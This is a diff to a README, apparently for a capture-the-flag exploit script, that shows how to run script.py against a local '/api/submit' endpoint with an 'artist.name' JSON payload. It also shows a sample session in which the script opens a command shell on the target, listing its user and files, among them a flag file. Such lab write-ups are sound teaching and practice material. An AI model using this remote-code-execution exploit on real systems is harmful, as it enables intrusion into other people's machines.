@@ -23,8 +23,31 @@ you need with the `-j,--json` flag.
 ```bash
 python script.py -u "http://localhost:1337/api/submit" -j blitz.json
 ```
-if needed, you can just write the JSON object
+If needed, you can just write the JSON object
 
 ```bash
 python script.py --url "http://localhost:1337/api/submit" --json '{artist.name: "Haigh"}'
+```
+Once you run the script, you should se a command line that allows you to run code on the
+attacked machine
+
+```
+$ python script.py --url "http://localhost:1337/api/submit" --json '{"artist.name": "Haigh"}'
+	>id
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+
+	>ls
+flagnjEYE
+index.js
+node_modules
+package.json
+routes
+static
+views
+yarn.lock
+
+	>exit
+
+Goodbye!
+$
 ```
